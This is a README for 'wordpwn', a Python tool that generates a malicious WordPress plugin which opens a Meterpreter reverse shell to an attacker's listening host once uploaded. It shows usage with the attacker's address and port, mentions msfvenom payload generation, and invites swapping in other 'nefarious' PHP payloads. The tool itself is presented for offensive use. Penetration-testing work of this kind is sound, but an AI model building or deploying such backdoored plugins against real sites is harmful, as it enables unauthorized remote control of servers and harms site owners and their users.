# malicious-wordpress-plugin
Simply generates a wordpress plugin that will grant you a reverse shell once uploaded. I recommend installing Kali Linux, as msfvenom is used to generate the payload.

#### Usage Example
```sh
root@wetw0rk:~# python wordpwn.py 
__        __            _
\ \      / /__  _ __ __| |_ ____      ___ __
 \ \ /\ / / _ \|  __/ _  |  _ \ \ /\ / /  _ \ 
  \ V  V / (_) | | | (_| | |_) \ V  V /| | | |
   \_/\_/ \___/|_|  \__,_| .__/ \_/\_/ |_| |_|
                         |_|


Usage: wordpwn.py [LHOST] [LPORT] [HANDLER]
Example: wordpwn.py 192.168.0.6 8888 Y
```

### How and When do I use this?

Usage is super simple, simply pass wordpwn your listening address and listening port. You are also given the option to start a handler, I recommend that you do... since by default the plugin will be made using a php/meterpreter/reverse_tcp shell. If you have your own nefarious PHP payload simply adjust the script to accept it. If usage is still a mystery to you [JavaRockstar](https://github.com/JavaRockstar) has made a tutorial on his website which can be found here [HackingVision](https://hackingvision.com/2017/04/11/hacking-wordpress-website-malicious-plug/).

### PLEASE READ!
I want to be 100% sure that I give credit to [Rob Carr](https://www.rastating.com/). Rob Carr is the author of the Metasploit module wp_admin_shell_upload, which this script is based on. You can find more information on his module at [Rapid7](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload) .
